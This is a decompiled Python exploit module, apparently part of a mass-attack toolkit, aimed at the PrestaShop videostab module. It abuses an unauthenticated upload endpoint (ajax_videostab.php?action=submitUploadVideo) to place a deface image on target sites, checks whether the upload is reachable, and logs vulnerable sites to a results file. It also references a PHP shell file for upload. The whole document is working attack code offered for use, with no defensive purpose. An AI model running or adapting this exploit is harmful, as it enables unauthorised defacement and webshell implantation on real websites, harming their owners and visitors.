# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Presta_videostab.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'

def Exploit(site):
    try:
        Exp = site + '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload'
        Checkvuln = requests.get('http://' + Exp, timeout=5, headers=Headers)
        FileDataIndex = {'qqfile': open(Jce_Deface_image, 'rb')}
        if Checkvuln.status_code == 200:
            requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=Headers)
            IndexPath = site + '/modules/videostab/uploads/' + Jce_Deface_image.split('/')[1]
            CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=Headers)
            if 'GIF89a' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndexPath + '\n')
                return printModule.returnYes(site, 'N/A', 'videostab Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'videostab Module', 'Prestashop')

        else:
            return printModule.returnNo(site, 'N/A', 'videostab Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'videostab Module', 'Prestashop')